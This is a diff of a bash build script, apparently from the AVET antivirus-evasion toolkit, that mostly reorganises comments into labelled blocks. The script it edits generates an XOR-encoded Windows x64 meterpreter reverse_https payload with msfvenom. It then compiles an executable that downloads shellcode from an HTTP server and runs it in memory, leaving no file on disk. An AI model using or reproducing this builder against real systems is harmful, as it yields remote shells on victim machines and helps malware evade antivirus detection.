@@ -1,10 +1,10 @@
 #!/bin/bash 
-# Downloads and executes 64-bit shellcode, using sockets. Applies metasploit XOR encoding.
 
-# The generated msf shellcode file needs to be hosted on a HTTP server
-# Call the executable like:
-# output.exe http://yourserver/thepayload.bin
-# The executable downloads the shellcode into memory (no file is dropped on disk) and executes it.
+
+#DESCRIPTION_START
+# Downloads and executes 64-bit shellcode, using sockets. Applies metasploit XOR encoding.
+#DESCRIPTION_END
+
 
 # print AVET logo
 cat banner.txt
@@ -20,9 +20,14 @@ cat banner.txt
 # import global default lhost and lport values from build/global_connect_config.sh
 . build/global_connect_config.sh
 
+#CONFIGURATION_START
 # override connect-back settings here, if necessary
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
+# enable debug output
+enable_debug_print
+#CONFIGURATION_END
+
 
 # make meterpreter reverse payload
 msfvenom -p windows/x64/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x64/xor -b '\x00' -f raw --platform Windows > output/thepayload.bin
@@ -44,9 +49,6 @@ set_payload_info_source no_data
 # set shellcode binding technique
 set_payload_execution_method exec_shellcode64
 
-# enable debug output
-enable_debug_print
-
 # compile
 $win64_compiler -o output/downloadsocket_mtrprtrxor_revhttps_win64.exe source/avet.c -lwsock32 -lWs2_32
 strip output/downloadsocket_mtrprtrxor_revhttps_win64.exe
@@ -58,3 +60,11 @@ echo "The generated msf shellcode file needs to be hosted on a HTTP server
 Call the executable like:
 downloadsocket_mtrprtrxor_revhttps_win64.exe http://yourserver/thepayload.bin
 The executable downloads the shellcode into memory (no file is dropped on disk) and executes it."
+
+
+#USAGE_START
+# The generated msf shellcode file needs to be hosted on a HTTP server
+# Call the executable like:
+# output.exe http://yourserver/thepayload.bin
+# The executable downloads the shellcode into memory (no file is dropped on disk) and executes it.
+#USAGE_END
